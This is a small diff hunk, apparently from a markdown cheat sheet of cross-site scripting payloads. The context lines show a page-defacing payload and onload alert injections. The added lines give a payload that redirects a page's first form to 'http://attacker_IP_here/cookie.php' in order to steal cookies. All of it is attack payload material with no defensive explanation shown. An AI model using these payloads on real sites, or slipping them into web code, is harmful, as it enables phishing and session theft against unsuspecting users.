@@ -6079,6 +6079,8 @@ document.body.innerHTML="some_defacing_here";
 " onload="alert('XSS')
 " onload="alert(String.fromCharCode()88,83,83) #'XSS'
 
+# XSS phishing: steal cookies through form action
+document.forms[0].action="http://attacker_IP_here/cookie.php";
 ```
 
 
